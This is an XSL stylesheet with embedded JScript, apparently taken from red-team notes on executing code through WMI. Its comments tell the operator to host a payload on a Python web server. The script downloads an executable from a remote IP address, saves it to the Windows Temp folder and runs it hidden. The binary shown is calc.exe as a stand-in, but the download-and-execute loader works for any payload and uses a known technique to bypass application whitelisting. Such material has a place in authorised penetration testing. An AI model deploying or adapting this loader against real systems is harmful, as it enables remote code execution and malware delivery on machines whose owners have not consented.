<!-- Resource -->
<!-- https://dmcxblue.gitbook.io/red-team-notes/execution/windows-management-instrumentation-wmi-->
<!-- on Remote Server Host our Payload: python3 -m http.server 2020 -->

<?xml version='1.0'?>
<stylesheet
xmlns="http://www.w3.org/1999/XSL/Transform" 
xmlns:ms="urn:schemas-microsoft-com:xslt"
xmlns:user="placeholder"
version="1.0">
<output method="text"/>
    <ms:script implements-prefix="user" language="JScript">
    <![CDATA[
    //Download calc.exe from Python HTTP server
    var calcUrl = "http://192.168.10.10:2020/calc.exe";
    var destPath = "C:\\Windows\\Temp\\calc.exe";
    
    var xhr = new ActiveXObject("MSXML2.XMLHTTP.6.0");
    xhr.open("GET", calcUrl, false);
    xhr.send();
    
    //Save the downloaded file
    var stream = new ActiveXObject("ADODB.Stream");
    stream.Type = 1; // Binary
    stream.Open();
    stream.Write(xhr.responseBody);
    stream.SaveToFile(destPath, 2); // Overwrite if exists
    stream.Close();
    
    //Execute the downloaded calculator
    var shell = new ActiveXObject("WScript.Shell");
    shell.Run(destPath, 0, false);
    ]]>
    </ms:script>
</stylesheet>
